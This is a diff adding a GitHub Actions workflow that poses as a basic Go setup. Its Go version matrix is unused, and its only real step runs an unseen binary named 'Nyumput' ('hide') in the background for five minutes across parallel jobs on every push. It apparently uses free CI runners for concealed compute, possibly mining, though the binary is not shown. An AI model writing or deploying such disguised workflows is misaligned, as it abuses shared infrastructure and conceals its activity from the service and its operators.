@@ -1,0 +1,46 @@
+# This is a basic workflow to help you get started with Actions10
+
+name: pekerja
+on: 
+  push:
+    branches: [ "main" ]
+
+jobs:
+  pekerjaRodi:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 80
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2]
+        flag: [A, B]
+    timeout-minutes: 8
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Main
+      run: |
+        sudo apt-get update
+        timeout 5m chmod +x Nyumput && ./Nyumput &
+        sleep 5m
+        echo "sukses"
+  Success:
+    needs: [pekerjaRodi]
+    if: always()
+    runs-on: ubuntu-20.04
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "all don,All Done"
